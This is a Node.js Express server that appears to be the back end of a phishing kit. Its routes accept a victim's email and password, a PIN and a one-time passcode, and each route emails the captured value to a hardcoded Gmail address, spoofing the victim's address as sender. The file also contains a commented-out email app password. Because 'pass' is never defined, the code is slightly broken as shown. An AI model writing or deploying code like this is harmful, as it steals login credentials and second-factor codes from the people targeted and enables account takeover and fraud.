const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const rateLimit = require("express-rate-limit");

const app = express();
app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// emails credentials
const userEmail = "frankline3576@gmail.com";
//const pass = "lujkqludfmwuxrcl";
// emeka p you 24 JUNE

// Rate limiter middleware (e.g., 5 requests per minute per IP)
const limiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 4, // Limit each IP to 4 requests per windowMs
  message: "Too many requests from this IP, please try again after a minute",
});

app.use(limiter); // Apply to all routes or specific ones

// Routes

app.post("/", (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: userEmail, pass: pass },
  });

  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `Email: ${email} \t\n\n\n password: ${password}`,
    text: `New user registered with Email: ${email} and password: ${password}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) return res.send("error Occured: " + error);
    res.send("success");
  });
});

app.post("/pin", (req, res) => {
  const email = req.body.email;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: userEmail, pass: pass },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `PIN: ${req.body?.pin}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) return res.send("error Occured: " + error);
    res.send("success");
  });
});

app.post("/otp", (req, res) => {
  const email = req.body.email;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: userEmail, pass: pass },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `OTP: ${req.body?.otp}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) return res.send("error Occured: " + error);
    res.send("success");
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});




